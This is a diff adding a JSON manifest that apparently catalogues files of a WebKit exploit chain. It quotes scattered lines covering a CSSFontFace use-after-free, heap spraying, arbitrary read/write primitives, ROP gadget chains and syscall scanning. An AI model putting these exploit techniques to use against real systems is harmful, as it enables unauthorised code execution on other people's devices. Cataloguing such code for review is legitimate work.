+          "text": "this.store_view.setBInt(0x10, gadgets.MOV_RDI_QWORD_PTR_RAX_8_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_20, true);"
+        },
+        {
+          "line": 308,
+          "text": "this.store_view.setBInt(0x18, gadgets.PUSH_RBP_MOV_RBP_RSP_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10, true);"
+        },
+        {
+          "line": 311,
+          "text": "this.pivot_view.setBInt(8, gadgets.PUSH_RDI_POP_RSP_RET, true);"
+        },
+        {
+          "line": 312,
+          "text": "this.pivot_view.setBInt(0x20, gadgets.MOV_RDI_QWORD_PTR_RAX_10_JMP_QWORD_PTR_RAX_8, true);"
+        },
+        {
+          "line": 314,
+          "text": "this.pivot_view.setBInt(0x10, gadgets.PUSH_RDX_POP_RSP_RET, true);"
+        },
+        {
+          "line": 315,
+          "text": "this.pivot_view.setBInt(0x20, gadgets.MOV_RDX_QWORD_PTR_RAX_18_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10, true);"
+        },
+        {
+          "line": 337,
+          "text": "if (!syscalls.has(input)) {"
+        },
+        {
+          "line": 338,
+          "text": "throw new Error(`Syscall ${input} not found !!`);"
+        },
+        {
+          "line": 341,
+          "text": "this.addr = syscalls.get(input);"
+        },
+        {
+          "line": 350,
+          "text": "rop.reset();"
+        },
+        {
+          "line": 352,
+          "text": "rop.frame.set_value(\"rip\", this.addr);"
+        },
+        {
+          "line": 353,
+          "text": "rop.frame.set_value(\"rax\", 0);"
+        },
+        {
+          "line": 377,
+          "text": "rop.frame.set_value(reg, value);"
+        },
+        {
+          "line": 380,
+          "text": "rop.execute();"
+        },
+        {
+          "line": 388,
+          "text": "result = rop.frame.get_value(\"rax\");"
+        },
+        {
+          "line": 423,
+          "text": "const regs = [gadgets.POP_RDI_RET, gadgets.POP_RSI_RET, gadgets.POP_RDX_RET, gadgets.POP_RCX_RET, gadgets.POP_R8_RET, gadgets.POP_R9_RET];"
+        },
+        {
+          "line": 427,
+          "text": "insts.push(gadgets.POP_RAX_RET);"
+        },
+        {
+          "line": 454,
+          "text": "//  insts.push(gadgets.RET); // alignment for xmm/ymm"
+        },
+        {
+          "line": 460,
+          "text": "//  insts.push(gadgets.RET); // alignment for xmm/ymm"
+        },
+        {
+          "line": 478,
+          "text": "let offset = 0;"
+        },
+        {
+          "line": 486,
+          "text": "field.offset = offset = offset.alignUp(field.align);"
+        },
+        {
+          "line": 489,
+          "text": "offset += field.size * field.count;"
+        },
+        {
+          "line": 496,
+          "text": "this.sizeof = offset.alignUp(alignof);"
+        },
+        {
+          "line": 507,
+          "text": "get: (target, prop) => {"
+        },
+        {
+          "line": 508,
+          "text": "if (prop in target) return target[prop];"
+        },
+        {
+          "line": 510,
+          "text": "if (!isNaN(prop)) {"
+        },
+        {
+          "line": 511,
+          "text": "const i = Number(prop);"
+        },
+        {
+          "line": 515,
+          "text": "const field = target.struct.fields[prop];"
+        },
+        {
+          "line": 519,
+          "text": "let addr = target.addr.add(field.offset);"
+        },
+        {
+          "line": 547,
+          "text": "addr = arw.view(target.addr).getBInt(field.offset, true);"
+        },
+        {
+          "line": 576,
+          "text": "set: (target, prop, value) => {"
+        },
+        {
+          "line": 577,
+          "text": "if (!isNaN(prop)) {"
+        },
+        {
+          "line": 578,
+          "text": "const i = Number(prop);"
+        },
+        {
+          "line": 579,
+          "text": "if (!value.hasOwnProperty(\"struct\")) {"
+        },
+        {
+          "line": 589,
+          "text": "const field = target.struct.fields[prop];"
+        },
+        {
+          "line": 593,
+          "text": "let addr = target.addr.add(field.offset);"
+        },
+        {
+          "line": 613,
+          "text": "arw.view(target.addr).setBInt(field.offset, value, true);"
+        },
+        {
+          "line": 620,
+          "text": "if (!value.hasOwnProperty(\"addr\")) {"
+        },
+        {
+          "line": 767,
+          "text": "if (!fn.hasOwnProperty(\"_error\")) {"
+        },
+        {
+          "line": 775,
+          "text": "if (!fn.hasOwnProperty(\"_strerror\")) {"
+        },
+        {
+          "line": 793,
+          "text": "throw new SyscallError(`Unable to sleep for ${nsec} nano seconds !!`);"
+        },
+        {
+          "line": 846,
+          "text": "document.body.offsetTop;"
+        },
+        {
+          "line": 850,
+          "text": "Object.defineProperty(FontFace.prototype, \"then\", {"
+        },
+        {
+          "line": 858,
+          "text": "document.body.offsetTop;"
+        },
+        {
+          "line": 870,
+          "text": "document.body.offsetTop;"
+        },
+        {
+          "line": 874,
+          "text": "const ab = new ArrayBuffer(constants.wk_CSSFontFace_sizeof);"
+        },
+        {
+          "line": 878,
+          "text": "view.setUint8(constants.wk_CSSFontFace_m_status, 3); // m_status: Status::Success"
+        },
+        {
+          "line": 894,
+          "text": "Object.defineProperty(FontFace.prototype, \"then\", {"
+        },
+        {
+          "line": 951,
+          "text": "let offset = 0;"
+        },
+        {
+          "line": 952,
+          "text": "while (offset < size) {"
+        },
+        {
+          "line": 953,
+          "text": "const ptr = addr.add(offset);"
+        },
+        {
+          "line": 955,
+          "text": "uaf_view.setBInt(constants.wk_CSSFontFace_m_featureSettings_m_buffer, ptr, true); // m_featureSettings.m_buffer"
+        },
+        {
+          "line": 956,
+          "text": "uaf_view.setInt32(constants.wk_CSSFontFace_m_featureSettings_m_size, 1, true); // m_featureSettings.m_size"
+        },
+        {
+          "line": 957,
+          "text": "uaf_view.setInt32(constants.wk_CSSFontFace_m_featureSettings_m_capacity, 1, true); // m_featureSettings.m_capacity"
+        },
+        {
+          "line": 961,
+          "text": "u8[offset++] = this.uaf_font.featureSettings.charCodeAt(i);"
+        },
+        {
+          "line": 986,
+          "text": "const m_clients = uaf_view.getBInt(constants.wk_CSSFontFace_m_clients, true);"
+        },
+        {
+          "line": 987,
+          "text": "const m_wrapper = uaf_view.getBInt(constants.wk_CSSFontFace_m_wrapper, true);"
+        },
+        {
+          "line": 998,
+          "text": "const props = [];"
+        },
+        {
+          "line": 1001,
+          "text": "// Spray marker and target JS object as props"
+        },
+        {
+          "line": 1003,
+          "text": "props.push({ value: marker });"
+        },
+        {
+          "line": 1004,
+          "text": "props.push({ value: rw.leak });"
+        },
+        {
+          "line": 1011,
+          "text": "// Allocates Vector<PropertyDescriptor> and MarkedArgumentBuffer, both of which uses fastMalloc which will spray our props into fastMalloc heap"
+        },
+        {
+          "line": 1012,
+          "text": "Object.defineProperties({}, props);"
+        },
+        {
+          "line": 1049,
+          "text": "// Prepare container's properties to be used with fakeobj to create arw.master view over arw.victim DataView"
+        },
+        {
+          "line": 1082,
+          "text": "const m_thread = rw.read8(css_font_addr.add(constants.wk_CSSFontFace_m_thread));"
+        },
+        {
+          "line": 1085,
+          "text": "webkit_base = css_font_vtable.sub(constants.wk_CSSFontFace_vtable);"
+        },
+        {
+          "line": 1086,
+          "text": "logger.info(`webkit_base: ${webkit_base}`);"
+        },
+        {
+          "line": 1098,
+          "text": "let fake_vtable_gadget;"
+        },
+        {
+          "line": 1099,
+          "text": "let dst_addr_offset;"
+        },
+        {
+          "line": 1102,
+          "text": "fake_vtable_gadget = gadgets.MOV_RAX_QWORD_PTR_RDI_8_MOV_RCX_QWORD_PTR_RDI_10_MOV_QWORD_PTR_RCX_2060_RAX_RET;"
+        },
+        {
+          "line": 1103,
+          "text": "dst_addr_offset = 0x2060;"
+        },
+        {
+          "line": 1105,
+          "text": "fake_vtable_gadget = gadgets.MOV_RAX_QWORD_PTR_RDI_8_MOV_RCX_QWORD_PTR_RDI_10_MOV_QWORD_PTR_RCX_2330_RAX_RET;"
+        },
+        {
+          "line": 1106,
+          "text": "dst_addr_offset = 0x2330;"
+        },
+        {
+          "line": 1108,
+          "text": "fake_vtable_gadget = gadgets.MOV_RAX_QWORD_PTR_RDI_8_MOV_RCX_QWORD_PTR_RDI_10_MOV_QWORD_PTR_RCX_21d8_RAX_RET;"
+        },
+        {
+          "line": 1109,
+          "text": "dst_addr_offset = 0x21d8;"
+        },
+        {
+          "line": 1111,
+          "text": "fake_vtable_gadget = gadgets.MOV_RAX_QWORD_PTR_RDI_8_MOV_RCX_QWORD_PTR_RDI_10_MOV_QWORD_PTR_RCX_2238_RAX_RET;"
+        },
+        {
+          "line": 1112,
+          "text": "dst_addr_offset = 0x2238;"
+        },
+        {
+          "line": 1115,
+          "text": "fake_vtable.setBInt(8, fake_vtable_gadget, true);"
+        },
+        {
+          "line": 1119,
+          "text": "fake_obj.setBInt(0x10, rw_leak_obj_addr.sub(dst_addr_offset), true);"
+        },
+        {
+          "line": 1121,
+          "text": "// Needed to survive crash from calling CSSFontFaceSet::add/CSSFontFaceSet::remove"
+        },
+        {
+          "line": 1122,
+          "text": "uaf_view.setUint8(constants.wk_CSSFontFace_m_status, 4); // m_status: Status::Failure"
+        },
+        {
+          "line": 1126,
+          "text": "// Prepare UAF FontFace to be freed on CSSFontFaceSet::remove call and execute our fake vtable"
+        },
+        {
+          "line": 1131,
+          "text": "uaf_view.setBInt(constants.wk_CSSFontFace_m_clients, m_clients, true); // m_clients"
+        },
+        {
+          "line": 1132,
+          "text": "uaf_view.setBInt(constants.wk_CSSFontFace_m_wrapper, m_wrapper, true); // m_wrapper"
+        },
+        {
+          "line": 1133,
+          "text": "uaf_view.setUint8(constants.wk_CSSFontFace_m_status, 4); // m_status: Status::Failure"
+        },
+        {
+          "line": 1134,
+          "text": "uaf_view.setBInt(constants.wk_CSSFontFace_m_thread, m_thread, true); // m_thread"
+        },
+        {
+          "line": 1135,
+          "text": "uaf_view.setBInt(constants.wk_CSSFontFace_m_function, fake_obj_m_vector, true); // m_function"
+        },
+        {
+          "line": 1175,
+          "text": "g_JSArrayBufferPoison = arw.view(webkit_base).getBInt(constants.wk_g_JSArrayBufferPoison, true);"
+        },
+        {
+          "line": 1176,
+          "text": "g_JSFunctionPoison = arw.view(webkit_base).getBInt(constants.wk_g_JSFunctionPoison, true);"
+        },
+        {
+          "line": 1177,
+          "text": "g_NativeCodePoison = arw.view(webkit_base).getBInt(constants.wk_g_NativeCodePoison, true);"
+        },
+        {
+          "line": 1183,
+          "text": "function init_rop() {"
+        },
+        {
+          "line": 1184,
+          "text": "logger.info(\"Initiate ROP...\");"
+        },
+        {
+          "line": 1197,
+          "text": "logger.info(`webkit base: ${webkit_base}`);"
+        },
+        {
+          "line": 1199,
+          "text": "strerror_addr = arw.view(webkit_base).getBInt(constants.wk___imp_strerror, true);"
+        },
+        {
+          "line": 1205,
+          "text": "_error_addr = arw.view(webkit_base).getBInt(constants.wk___imp___error, true);"
+        },
+        {
+          "line": 1208,
+          "text": "libkernel_base = _error_addr.sub(constants.k__error);"
+        },
+        {
+          "line": 1209,
+          "text": "logger.info(`libkernel base: ${libkernel_base}`);"
+        },
+        {
+          "line": 1214,
+          "text": "m_function_pivot = g_NativeCodePoison.xor(gadgets.MOV_RDI_RDI_30_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_120);"
+        },
+        {
+          "line": 1216,
+          "text": "m_function_pivot = gadgets.MOV_RDI_RDI_30_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_40;"
+        },
+        {
+          "line": 1218,
+          "text": "m_function_pivot = gadgets.MOV_RDI_RSI_30_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX;"
+        },
+        {
+          "line": 1223,
+          "text": "rop.pivot = new Pivot();"
+        },
+        {
+          "line": 1224,
+          "text": "rop.stack = new Stack(0x2000);"
+        },
+        {
+          "line": 1225,
+          "text": "rop.frame = new Frame([\"jmp_rax\", \"rsp\", \"rax\", \"rip\", \"rdi\", \"rsi\", \"rdx\", \"rcx\", \"r8\", \"r9\"]);"
+        },
+        {
+          "line": 1227,
+          "text": "rop.insts.push(gadgets.POP_RAX_RET);"
+        },
+        {
+          "line": 1228,
+          "text": "rop.insts.push(rop.frame.addrof(\"jmp_rax\"));"
+        },
+        {
+          "line": 1229,
+          "text": "rop.insts.push(gadgets.PUSH_RBP_JMP_QWORD_PTR_RAX);"
+        },
+        {
+          "line": 1231,
+          "text": "rop.frame.store(rop.insts, \"rsp\");"
+        },
+        {
+          "line": 1233,
+          "text": "rop.insts.push(gadgets.POP_RAX_RET);"
+        },
+        {
+          "line": 1234,
+          "text": "rop.frame.valueof(rop.insts, \"rax\");"
+        },
+        {
+          "line": 1236,
+          "text": "rop.insts.push(gadgets.POP_RDI_RET);"
+        },
+        {
+          "line": 1237,
+          "text": "rop.frame.valueof(rop.insts, \"rdi\");"
+        },
+        {
+          "line": 1239,
+          "text": "rop.insts.push(gadgets.POP_RSI_RET);"
+        },
+        {
+          "line": 1240,
+          "text": "rop.frame.valueof(rop.insts, \"rsi\");"
+        },
+        {
+          "line": 1242,
+          "text": "rop.insts.push(gadgets.POP_RDX_RET);"
+        },
+        {
+          "line": 1243,
+          "text": "rop.frame.valueof(rop.insts, \"rdx\");"
+        },
+        {
+          "line": 1245,
+          "text": "rop.insts.push(gadgets.POP_RCX_RET);"
+        },
+        {
+          "line": 1246,
+          "text": "rop.frame.valueof(rop.insts, \"rcx\");"
+        },
+        {
+          "line": 1248,
+          "text": "rop.insts.push(gadgets.POP_R8_RET);"
+        },
+        {
+          "line": 1249,
+          "text": "rop.frame.valueof(rop.insts, \"r8\");"
+        },
+        {
+          "line": 1251,
+          "text": "rop.insts.push(gadgets.POP_R9_RET);"
+        },
+        {
+          "line": 1252,
+          "text": "rop.frame.valueof(rop.insts, \"r9\");"
+        },
+        {
+          "line": 1254,
+          "text": "rop.frame.valueof(rop.insts, \"rip\");"
+        },
+        {
+          "line": 1256,
+          "text": "rop.frame.store(rop.insts, \"rax\");"
+        },
+        {
+          "line": 1258,
+          "text": "rop.frame.load(rop.insts, \"rsp\");"
+        },
+        {
+          "line": 1259,
+          "text": "rop.insts.push(gadgets.PUSH_RAX_POP_RBP_RET);"
+        },
+        {
+          "line": 1260,
+          "text": "rop.insts.push(gadgets.POP_RAX_RET);"
+        },
+        {
+          "line": 1261,
+          "text": "rop.insts.push(0);"
+        },
+        {
+          "line": 1262,
+          "text": "rop.insts.push(gadgets.LEAVE_RET);"
+        },
+        {
+          "line": 1267,
+          "text": "logger.info(\"Achieved ROP !!\");"
+        },
+        {
+          "line": 1270,
+          "text": "function init_syscalls() {"
+        },
+        {
+          "line": 1271,
+          "text": "logger.info(\"Initiate SYSCALLS...\");"
+        },
+        {
+          "line": 1273,
+          "text": "scan_syscalls(libkernel_base);"
+        },
+        {
+          "line": 1275,
+          "text": "// syscall functions"
+        },
+        {
+          "line": 1288,
+          "text": "logger.info(\"Initiated SYSCALLS !!\");"
+        },
+        {
+          "line": 1291,
+          "text": "function scan_syscalls(base) {"
+        },
+        {
+          "line": 1292,
+          "text": "if (syscalls.size > 0) {"
+        },
+        {
+          "line": 1293,
+          "text": "logger.info(`Already found ${syscalls.size} syscalls !!`);"
+        },
+        {
+          "line": 1305,
+          "text": "let offset = 0;"
+        },
+        {
+          "line": 1306,
+          "text": "while (offset < size) {"
+        },
+        {
+          "line": 1307,
+          "text": "const b = u8[offset];"
+        },
+        {
+          "line": 1312,
+          "text": "match = offset;"
+        },
+        {
+          "line": 1321,
+          "text": "syscalls.set(id, addr);"
+        },
+        {
+          "line": 1329,
+          "text": "offset++;"
+        },
+        {
+          "line": 1332,
+          "text": "logger.info(`Found ${syscalls.size} syscalls !!`);"
+        }
+      ],
+      "13_52_status": "MISSING_UNVERIFIED"
+    },
+    {
+      "path": "public/src/worker.js",
+      "size": 1615,
+      "sha256": "d7bd66b6737545227dd691b40f465a68da032365cf5703a995f227572fcb27f3",
+      "category": "EXPLOIT_CHAIN_REFERENCE_ONLY",
+      "marker_count": 3,
+      "markers": [
+        {
+          "line": 39,
+          "text": "webkit_base = new BInt(wk_base);"
+        },
+        {
+          "line": 42,
+          "text": "init_rop();"
+        },
+        {
+          "line": 43,
+          "text": "init_syscalls();"
+        }
+      ],
+      "13_52_status": "MISSING_UNVERIFIED"
+    },
+    {
+      "path": "public/src/workers.js",
+      "size": 2432,
+      "sha256": "199ae642c1c0bdd4e42ebe694ced604f195fc1738eb16c087f33aab03a4cae30",
+      "category": "EXPLOIT_CHAIN_REFERENCE_ONLY",
+      "marker_count": 6,
+      "markers": [
+        {
+          "line": 69,
+          "text": "const marker_butterfly_prop_addr = marker_butterfly_addr.sub(0x20);"
+        },
+        {
+          "line": 70,
+          "text": "logger.debug(`marker_butterfly_prop_addr: ${marker_butterfly_prop_addr}`);"
+        },
+        {
+          "line": 72,
+          "text": "const victim_addr = arw.view(marker_butterfly_prop_addr).getBInt(0, true);"
+        },
+        {
+          "line": 75,
+          "text": "const master_addr = arw.view(marker_butterfly_prop_addr).getBInt(8, true);"
+        },
+        {
+          "line": 78,
+          "text": "const leak_addr = arw.view(marker_butterfly_prop_addr).getBInt(0x10, true);"
+        },
+        {
+          "line": 83,
+          "text": "await this.execute(\"setup\", leak_addr, webkit_base);"
+        }
+      ],
+      "13_52_status": "MISSING_UNVERIFIED"
+    }
+  ]
+}
